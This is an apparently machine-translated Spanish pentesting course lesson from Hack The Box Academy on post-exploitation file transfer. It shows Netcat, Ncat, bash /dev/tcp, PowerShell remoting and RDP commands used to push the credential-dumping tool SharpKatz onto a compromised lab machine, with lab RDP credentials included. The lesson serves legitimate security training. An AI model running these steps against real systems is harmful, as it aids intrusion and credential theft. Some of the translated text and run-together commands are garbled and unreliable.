# Métodos de transferencia de archivos varios

Hemos cubierto varios métodos para transferir archivos en Windows y Linux. También cubrimos formas de lograr el mismo objetivo utilizando diferentes lenguajes de programación, pero todavía hay muchos más métodos y aplicaciones que podemos usar.

Esta sección cubrirá métodos alternativos, como transferir archivos, utilizando[Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/)y usando sesiones RDP y PowerShell.

---

# **Netcat**

[Netcat](https://sectools.org/tool/netcat/)(a menudo abreviado para`nc`) es una utilidad de red de computadora para leer y escribir en conexiones de red utilizando TCP o UDP, lo que significa que podemos usarla para las operaciones de transferencia de archivos.

El NetCat original era[liberado](http://seclists.org/bugtraq/1995/Oct/0028.html)por Hobbit en 1995, pero no se ha mantenido a pesar de su popularidad. La flexibilidad y la utilidad de esta herramienta llevaron al proyecto NMAP a producir[Ncat](https://nmap.org/ncat/), una reimplementación moderna que admite SSL, IPv6, medias y proxies HTTP, corredización de conexión y más.

En esta sección, utilizaremos tanto el NetCat y el NCAT original.

**Nota:** **Ncat**se usa en el Pwnbox de HackheBox como NC, NCAT y NETCAT.

# **Transferencia de archivos con NetCat y NCAT**

El objetivo o la máquina de ataque se pueden usar para iniciar la conexión, lo cual es útil si un firewall evita el acceso al objetivo. Creemos un ejemplo y transfiramos una herramienta a nuestro objetivo.

En este ejemplo, transferiremos[Sharpkatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)Desde nuestro Pwnbox hasta la máquina comprometida. Lo haremos usando dos métodos. Trabajemos en el primero.

Primero comenzaremos a NetCat (`nc`) en la máquina comprometida, escuchando con la opción`-l`, seleccionando el puerto para escuchar con la opción`-p 8000`, y redirigir el[stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin))usando un solo más grande que`>`seguido del nombre de archivo,`SharpKatz.exe`.

### **NetCat - Máquina comprometida - Escuchar en el puerto 8000**

Miscellaneous File Transfer Methods

```
victim@target:~$ # Example using Original Netcatvictim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Si la máquina comprometida está usando NCAT, necesitaremos especificar`--recv-only`Para cerrar la conexión una vez que la transferencia del archivo esté finalizada.

### **Ncat - Compromised Machine - Listening on Port 8000**

Métodos de transferencia de archivos varios

```
victim@target:~$ # Example using Ncatvictim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Desde nuestro host de ataque, nos conectaremos a la máquina comprometida en el puerto 8000 usando NetCat y enviaremos el archivo[Sharpkatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)como entrada a NetCat. La opción`-q 0`le dirá a NetCat que cierre la conexión una vez que termine. De esa manera, sabremos cuándo se completó la transferencia de archivos.

### **Netcat - host de ataque - envío de archivo a la máquina comprometida**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exexnoxos@htb[/htb]$ # Example using Original Netcatxnoxos@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

```

Al utilizar NCAT en nuestro anfitrión de ataque, podemos optar por`--send-only`en vez de`-q`. El`--send-only`El indicador, cuando se usa en los modos de conexión y escucha, pide a NCAT que termine una vez que se agota su entrada. Por lo general, NCAT continuaría ejecutándose hasta que se cierre la conexión de red, ya que el lado remoto puede transmitir datos adicionales. Sin embargo, con`--send-only`, no hay necesidad de anticipar más información entrante.

### **NCAT - Attack Host - Enviar archivo a la máquina comprometida**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exexnoxos@htb[/htb]$ # Example using Ncatxnoxos@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

```

En lugar de escuchar en nuestra máquina comprometida, podemos conectarnos a un puerto en nuestro host de ataque para realizar la operación de transferencia de archivos. Este método es útil en escenarios donde hay un firewall que bloquea las conexiones entrantes. Escuchemos en el puerto 443 en nuestro pwnbox y enviemos el archivo[Sharpkatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)como entrada a NetCat.

### **Attack Host - Enviar archivo como entrada a NetCat**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ # Example using Original Netcatxnoxos@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

```

### **La máquina comprometida se conecta a NetCat para recibir el archivo**

Métodos de transferencia de archivos varios

```
victim@target:~$ # Example using Original Netcatvictim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Hagamos lo mismo con NCAT:

### **Attack Host - Enviar archivo como entrada a NCAT**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ # Example using Ncatxnoxos@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

```

### **La máquina comprometida se conecta a NCAT para recibir el archivo**

Métodos de transferencia de archivos varios

```
victim@target:~$ # Example using Ncatvictim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Si no tenemos NetCat o NCAT en nuestra máquina comprometida, Bash admite operaciones de lectura/escritura en un archivo de pseudo-dispositivo[/dev/tcp/](https://tldp.org/LDP/abs/html/devref1.html).

Escribir en este archivo en particular hace que Bash abra una conexión TCP a`host:port`, y esta característica se puede usar para transferencias de archivos.

### **NetCAT: enviar el archivo como entrada a NetCat**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ # Example using Original Netcatxnoxos@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

```

### **NCAT: enviar archivo como entrada a NCAT**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ # Example using Ncatxnoxos@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

```

### **Máquina comprometida que se conecta a NetCat usando /dev /tcp para recibir el archivo**

Métodos de transferencia de archivos varios

```
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

```

**Nota:**La misma operación se puede usar para transferir archivos del host comprometido a nuestro Pwnbox.

---

# **PowerShell Session File Transfer**

Ya hablamos de hacer transferencias de archivos con PowerShell, pero puede haber escenarios en los que HTTP, HTTPS o SMB no están disponibles. Si ese es el caso, podemos usar[PowerShell a remoto](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), también conocido como WinRM, para realizar operaciones de transferencia de archivos.

[PowerShell a remoto](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)nos permite ejecutar scripts o comandos en una computadora remota utilizando sesiones de PowerShell. Los administradores comúnmente usan PowerShell Remoting para administrar computadoras remotas en una red, y también podemos usarlo para operaciones de transferencia de archivos. Por defecto, habilitar PowerShell Remoting crea un HTTP y un oyente HTTPS. Los oyentes se ejecutan en puertos predeterminados TCP/5985 para HTTP y TCP/5986 para HTTPS.

Para crear una sesión de remotación de PowerShell en una computadora remota, necesitaremos acceso administrativo, ser miembro del`Remote Management Users`agrupar, o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión. Creemos un ejemplo y transfiramos un archivo desde`DC01`a`DATABASE01`y viceversa.

Tenemos una sesión como`Administrator`en`DC01`, el usuario tiene derechos administrativos en`DATABASE01`y PowerShell Remoting está habilitado. Usemos Test-NetConnection para confirmar que podemos conectarnos a WinRM.

### **Desde DC01 - Confirmar el puerto WinRM TCP 5985 está abierto en la base de datos01.**

Métodos de transferencia de archivos varios

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01

```

Métodos de transferencia de archivos varios

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True

```

Porque esta sesión ya tiene privilegios sobre`DATABASE01`, no necesitamos especificar credenciales. En el ejemplo a continuación, se crea una sesión en la computadora remota nombrada`DATABASE01`y almacena los resultados en la variable nombrada`$Session`.

### **Cree una sesión de remotación de PowerShell a la base de datos01**

Métodos de transferencia de archivos varios

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Podemos usar el`Copy-Item`cmdlet para copiar un archivo de nuestra máquina local`DC01`hacia`DATABASE01`Sesión que tenemos`$Session`o viceversa.

### **Copiar samplefile.txt de nuestro localhost a la base de datos01**

Métodos de transferencia de archivos varios

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

```

### **Copiar database.txt de la sesión de base de datos01 a nuestro localhost**

Métodos de transferencia de archivos varios

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

# **RDP**

RDP (protocolo de escritorio remoto) se usa comúnmente en redes de Windows para acceso remoto. Podemos transferir archivos usando RDP copiando y pegando. Podemos hacer clic derecho y copiar un archivo de la máquina Windows al que nos conectamos y pegarlo en la sesión RDP.

Si estamos conectados desde Linux, podemos usar`xfreerdp`o`rdesktop`. Al momento de escribir`xfreerdp`y`rdesktop`Permita la copia de nuestra máquina de destino a la sesión RDP, pero puede haber escenarios en los que esto puede no funcionar como se esperaba.

Como alternativa para copiar y pegar, podemos montar un recurso local en el servidor RDP de destino.`rdesktop`o`xfreerdp`Se puede usar para exponer una carpeta local en la sesión remota de RDP.

### **Montaje de una carpeta de Linux con rdesktop**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### **Montaje de una carpeta Linux usando xfreerdp**

Métodos de transferencia de archivos varios

```
xnoxos@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Para acceder al directorio, podemos conectarnos a`\\tsclient\`, permitiéndonos transferir archivos hacia y desde la sesión RDP.

![](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

Alternativamente, desde Windows, el nativo[mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)Se puede usar un cliente de escritorio remoto.

![](https://academy.hackthebox.com/storage/modules/24/rdp.png)

Después de seleccionar la unidad, podemos interactuar con ella en la sesión remota que sigue.

**Nota:**Esta unidad no es accesible para otros usuarios que iniciaran la computadora de destino, incluso si logran secuestrar la sesión RDP.

---

# **La práctica hace la perfección**

Vale la pena hacer referencia a esta sección o crear sus propias notas sobre estas técnicas y aplicarlas a los laboratorios en otros módulos en la ruta de rol de trabajo del probador de penetración y más allá. Algunos módulos/secciones donde estos podrían ser útiles incluyen:

- `Active Directory Enumeration and Attacks`Evaluaciones de habilidades 1 y 2
- A lo largo de la`Pivoting, Tunnelling & Port Forwarding`módulo
- A lo largo de la`Attacking Enterprise Networks`módulo
- A lo largo de la`Shells & Payloads`módulo

Nunca se sabe a qué se enfrenta hasta que comience un laboratorio (o evaluación del mundo real). Una vez que domine una técnica en esta sección u otras secciones de este módulo, intente otra. Para cuando termine la ruta del rol de trabajo del probador de penetración, sería genial haber probado la mayoría, si no todas, de estas técnicas. Esto ayudará con su "memoria muscular" y le dará ideas sobre cómo cargar/descargar archivos cuando enfrenta un entorno diferente con ciertas restricciones que hacen que un método más fácil falle. En la siguiente sección, discutiremos la protección de nuestras transferencias de archivos cuando se trata de datos confidenciales.